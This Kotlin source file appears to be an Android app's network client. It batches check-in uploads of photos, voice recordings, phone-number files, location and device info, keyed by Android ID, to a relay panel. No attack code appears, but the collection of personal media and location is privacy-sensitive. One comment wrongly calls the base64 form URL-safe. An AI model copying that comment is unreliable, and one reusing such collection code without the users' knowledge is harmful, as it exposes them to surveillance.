package com.prf.security.net

import android.util.Log
import kotlinx.coroutines.CancellationException
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import kotlinx.serialization.json.Json
import kotlinx.serialization.json.JsonPrimitive
import kotlinx.serialization.json.add
import kotlinx.serialization.json.buildJsonArray
import kotlinx.serialization.json.buildJsonObject
import kotlinx.serialization.json.jsonObject
import kotlinx.serialization.json.jsonPrimitive
import kotlinx.serialization.json.put
import kotlinx.serialization.json.putJsonArray
import kotlinx.serialization.json.putJsonObject
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.File
import java.util.concurrent.TimeUnit

/**
 * The v1.2.0 network layer. The app no longer talks to a git provider directly; every
 * write goes through the PRF relay ([DEFAULT_SERVER], a Vercel deployment) which holds
 * the database credential in a server-side env var. The APK carries no token at all.
 *
 * ## Why the relay, and why batching
 *
 * v1.1.0 uploaded each file with its own HTTP PUT and the server answered 409 for stale
 * ones; worse, the whole check-in was packed into a single request body that the
 * serverless function could not accept. **This is the root cause of the v1.1.0 bug where
 * six photos were captured and only one was uploaded:** the queue already held all six,
 * the single oversized call failed on the body limit, and the retry loop kept failing
 * the same way. The fix lives here, not in capture - [chunkPhotos] splits the photos
 * into batches the relay can accept, and [upload] sends each batch as its own atomic
 * commit. A 6-photo check-in is now 2 commits of 3, not one permanently failing call.
 *
 * Wire contract (POST /api/android/upload):
 * ```
 * photos:[{p:"front_1.jpg", d:"<base64>"}]   // p is a BASENAME - the relay sanitizeName()
 *                                            // strips every char outside [a-zA-Z0-9._-].
 *                                            // Sending a path silently flattens it.
 * voices:[{p:"name.m4a", d:"<base64>"}]      // ditto, basename only
 * numbers:[{p:"989...txt", d:"<base64>"}]    // relay base64-decodes to UTF-8 text
 * location:{maps,geo,plusCode,raw,stamp}    // written verbatim as <id>/location/<stamp>.txt
 * info:"<user info.txt text>"                // UTF-8 text, written as-is
 * deleted:["<full/repo/path>"]               // server validates it starts with <androidId>/
 * ```
 */
class VercelApi(
    private val serverUrl: String,
) {

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(120, TimeUnit.SECONDS)
        .readTimeout(120, TimeUnit.SECONDS)
        .retryOnConnectionFailure(false)
        .build()

    private val json = Json { ignoreUnknownKeys = true; encodeDefaults = false }

    /** Outcome of one check-in upload (possibly several batched commits). */
    data class UploadResult(
        val ok: Boolean,
        val commitOids: List<String> = emptyList(),
        val error: String? = null,
    )

    /**
     * The device anchor. Called once per install (see [Prefs.pingedOnce]); the server
     * writes `<id>/info/user info.txt` from it, which is the file that keeps the device
     * folder present in the database even before any check-in lands.
     *
     * The body is built with [buildJsonObject]. Building it by hand-concatenated strings
     * broke once `info` contained a quote or a brace: the JSON was malformed, the server
     * answered 400, and the anchor never landed - the device was invisible in the panel.
     */
    suspend fun ping(androidId: String, info: String): Boolean = withContext(Dispatchers.IO) {
        val body = buildJsonObject {
            put("androidId", androidId)
            put("info", info)
        }
        try {
            val raw = post("$serverUrl/api/android/ping", body.toString())
            val parsed = json.parseToJsonElement(raw).jsonObject
            parsed["ok"]?.jsonPrimitive?.content == "true"
        } catch (t: Throwable) {
            Log.w(TAG, "ping failed: " + t.message)
            false
        }
    }

    /** Uploads one whole check-in, in one or more atomic commits. */
    suspend fun upload(
        androidId: String,
        checkInId: String,
        date: String,
        info: String?,
        photos: List<Part.Binary>,
        voices: List<Part.Binary>,
        location: Map<String, String>?,
        numbers: List<Part.Binary>,
        deleted: List<String>,
        clipboardThreats: Map<String, Int>? = null,
    ): UploadResult = withContext(Dispatchers.IO) {
        try {
            val chunks = chunkPhotos(photos)
            val oids = mutableListOf<String>()

            if (chunks.isEmpty()) {
                // Photo-less check-in: still one commit for info/location/numbers/marker.
                if (info == null && location == null && numbers.isEmpty() && deleted.isEmpty()) {
                    return@withContext UploadResult(ok = true)
                }
                val r = commit(
                    androidId, checkInId, date, info, location, numbers,
                    photoChunk = emptyList(), voices = voices, deleted = deleted,
                    clipboardThreats = clipboardThreats,
                )
                return@withContext if (r.ok) {
                    UploadResult(true, listOf(r.oid))
                } else {
                    UploadResult(false, error = r.err)
                }
            }

            // info/location/numbers/deleted ride the FIRST chunk, so a photo-less or
            // marker-only check-in still carries them; later chunks are photos-only.
            for ((i, chunk) in chunks.withIndex()) {
                val r = commit(
                    androidId = androidId,
                    checkInId = checkInId,
                    date = date,
                    info = if (i == 0) info else null,
                    location = if (i == 0) location else null,
                    numbers = if (i == 0) numbers else emptyList(),
                    photoChunk = chunk,
                    voices = voices,
                    deleted = if (i == 0) deleted else emptyList(),
                    clipboardThreats = if (i == 0) clipboardThreats else null,
                )
                if (r.ok) {
                    oids.add(r.oid)
                } else {
                    // A later batch failed: keep the oids that landed, report not-ok so
                    // the caller retries the whole check-in (already-sent batches are
                    // idempotent - same paths, same content).
                    return@withContext UploadResult(ok = false, commitOids = oids, error = r.err)
                }
            }
            UploadResult(ok = true, commitOids = oids)
        } catch (t: Throwable) {
            if (t is CancellationException) throw t
            UploadResult(ok = false, error = t.message ?: "upload failed")
        }
    }

    private suspend fun commit(
        androidId: String,
        checkInId: String,
        date: String,
        info: String?,
        location: Map<String, String>?,
        numbers: List<Part.Binary>,
        photoChunk: List<Part.Binary>,
        voices: List<Part.Binary>,
        deleted: List<String>,
        clipboardThreats: Map<String, Int>?,
    ): CommitResult = withContext(Dispatchers.IO) {
        val body = buildJson(
            androidId, checkInId, date, info, photoChunk, voices, location, numbers,
            deleted, clipboardThreats,
        )
        try {
            val raw = post("$serverUrl/api/android/upload", body)
            val parsed = json.parseToJsonElement(raw).jsonObject
            if (parsed["ok"]?.jsonPrimitive?.content == "true") {
                CommitResult(ok = true, oid = parsed["commitOid"]?.jsonPrimitive?.content ?: "")
            } else {
                CommitResult(ok = false, err = parsed["error"]?.jsonPrimitive?.content ?: "server error")
            }
        } catch (t: Throwable) {
            CommitResult(ok = false, err = t.message ?: "request failed")
        }
    }

    /**
     * Builds the /api/android/upload body.
     *
     * Photos and voices carry a **basename** in `p`. The relay runs `sanitizeName()`,
     * which replaces every character outside `[a-zA-Z0-9._-]` - including the slash -
     * with `_`. Sending `3a7b/images/2026-09-24/front_1.jpg` would be stored as
     * `3a7b_images_2026-09-24_front_1.jpg`, flattened into one wrong file. Only the leaf
     * name is ever sent; the relay already knows the device id and the date.
     */
    private fun buildJson(
        androidId: String,
        checkInId: String,
        date: String,
        info: String?,
        photos: List<Part.Binary>,
        voices: List<Part.Binary>,
        location: Map<String, String>?,
        numbers: List<Part.Binary>,
        deleted: List<String>,
        clipboardThreats: Map<String, Int>?,
    ): String = buildJsonObject {
        put("androidId", androidId)
        put("id", checkInId)
        put("date", date)

        if (info != null) {
            put("info", info)
        }

        if (photos.isNotEmpty()) {
            putJsonArray("photos") {
                for (ph in photos) add(buildJsonObject {
                    put("p", File(ph.path).name)
                    put("d", ph.data)
                })
            }
        }

        if (voices.isNotEmpty()) {
            putJsonArray("voices") {
                for (v in voices) add(buildJsonObject {
                    put("p", File(v.path).name)
                    put("d", v.data)
                })
            }
        }

        if (location != null) {
            putJsonObject("location") {
                for ((k, v) in location) put(k, v)
            }
        }

        if (numbers.isNotEmpty()) {
            putJsonArray("numbers") {
                for (n in numbers) add(buildJsonObject {
                    put("p", File(n.path).name)
                    put("d", n.data)
                })
            }
        }

        if (deleted.isNotEmpty()) {
            putJsonArray("deleted") {
                for (d in deleted) add(JsonPrimitive(d))
            }
        }

        if (clipboardThreats != null && clipboardThreats.isNotEmpty()) {
            putJsonObject("clipboardThreats") {
                for ((k, v) in clipboardThreats) put(k, v)
            }
        }
    }.toString()

    /**
     * Splits photos into relay-sized batches.
     *
     * Two limits apply: the serverless body cap (~4 MB) and a per-photo base64 cap of
     * [MAX_PHOTO_BYTES] enforced server-side. A batch holds at most [MAX_BATCH] photos
     * **or** [MAX_BATCH_BYTES] of base64, whichever comes first. An oversized single
     * photo is dropped with a log line rather than poisoning the whole check-in - a
     * 30 MB photo would otherwise fail the commit on every retry forever.
     */
    private fun chunkPhotos(photos: List<Part.Binary>): List<List<Part.Binary>> {
        if (photos.isEmpty()) return emptyList()
        val chunks = mutableListOf<MutableList<Part.Binary>>()
        var cur = mutableListOf<Part.Binary>()
        var curBytes = 0L
        for (ph in photos) {
            val len = ph.data.length.toLong()
            if (len > MAX_PHOTO_BYTES) {
                Log.w(TAG, "photo exceeds server limit, dropping: " + ph.path + " (" + len + " b64 chars)")
                continue
            }
            if (cur.isNotEmpty() && (cur.size >= MAX_BATCH || curBytes + len > MAX_BATCH_BYTES)) {
                chunks.add(cur)
                cur = mutableListOf()
                curBytes = 0
            }
            cur.add(ph)
            curBytes += len
        }
        if (cur.isNotEmpty()) chunks.add(cur)
        Log.i(TAG, "chunked " + photos.size + " photo(s) into " + chunks.size + " batch(es)")
        return chunks
    }

    private data class CommitResult(val ok: Boolean, val oid: String = "", val err: String? = null)

    private suspend fun post(url: String, jsonBody: String): String = withContext(Dispatchers.IO) {
        val req = Request.Builder()
            .url(url)
            .post(jsonBody.toRequestBody(JSON))
            .build()
        client.newCall(req).execute().use { res ->
            val text = res.body?.string().orEmpty()
            if (!res.isSuccessful) {
                throw RelayException(res.code, url, text)
            }
            text
        }
    }

    /** A file to send through the relay. Text is stored as UTF-8 on the server; binary as base64. */
    sealed class Part {
        abstract val path: String
        data class Text(override val path: String, val text: String) : Part()
        data class Binary(override val path: String, val data: String) : Part()
    }

    class RelayException(val code: Int, val url: String, val body: String) :
        Exception("relay " + code + " for " + url + ": " + body.take(300))

    companion object {
        private const val TAG = "VercelApi"
        private val JSON = "application/json; charset=utf-8".toMediaType()

        /** Default relay origin. Overridable from Settings for testing. */
        const val DEFAULT_SERVER = "https://prf-panel.vercel.app"

        /** Max photos per batch. 6 photos -> 2 batches of 3. */
        private const val MAX_BATCH = 3

        /** Max base64 bytes per batch. Stays under the ~4 MB serverless body cap. */
        private const val MAX_BATCH_BYTES = 3_000_000L

        /** Server rejects a photo whose base64 exceeds 25 MB. */
        private const val MAX_PHOTO_BYTES = 25_000_000L

        /**
         * Base64-encodes raw bytes for the relay. The relay base64-decodes photo, voice
         * and number payloads back into binary; every payload in a [Part.Binary] is
         * already encoded by the caller. Uses the URL-safe no-newline form so the JSON
         * body stays a single line.
         */
        fun b64(bytes: ByteArray): String = android.util.Base64.encodeToString(
            bytes, android.util.Base64.NO_WRAP,
        )
    }
}
